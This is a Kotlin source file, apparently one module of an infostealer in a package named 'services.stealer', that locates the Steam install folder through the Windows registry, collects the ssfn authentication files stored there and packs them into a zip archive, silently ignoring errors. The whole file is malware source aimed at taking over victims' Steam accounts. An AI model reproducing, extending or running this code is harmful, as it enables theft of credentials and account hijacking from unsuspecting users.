package services.stealer

import com.sun.jna.platform.win32.Advapi32Util
import com.sun.jna.platform.win32.WinReg
import java.io.File
import java.io.ByteArrayOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

object Steam : Module {
    const val REG_STEAM_KEY = "Software\\Valve\\Steam"
    const val SSFN_REGEX = "^ssfn\\d+$"
    const val SSFN_SIZE: Short = 2048

    override fun run(outputStream: ZipOutputStream) {
        if (!Advapi32Util.registryValueExists(WinReg.HKEY_CURRENT_USER, REG_STEAM_KEY, "SteamPath")) {
            return
        }

        val steamPath = Advapi32Util.registryGetStringValue(
            WinReg.HKEY_CURRENT_USER, REG_STEAM_KEY, "SteamPath"
        )
        val steamDir = File(steamPath)

        if (!steamDir.isDirectory) {
            return
        }

        val steamDirFiles = steamDir.listFiles() ?: return

        for (file in steamDirFiles) {
            if (!file.isFile || file.length().toShort() != SSFN_SIZE || !file.name.matches(Regex(SSFN_REGEX))) {
                continue
            }

            try {
                outputStream.putNextEntry(ZipEntry("steam/${file.name}"))
                outputStream.write(file.readBytes())
                outputStream.closeEntry()
            } catch (_: Exception) {
            }
        }
    }
}

fun main() {
    val byteOS = ByteArrayOutputStream()
    val zipOS = ZipOutputStream(byteOS)
    Steam.run(ZipOutputStream(zipOS))
}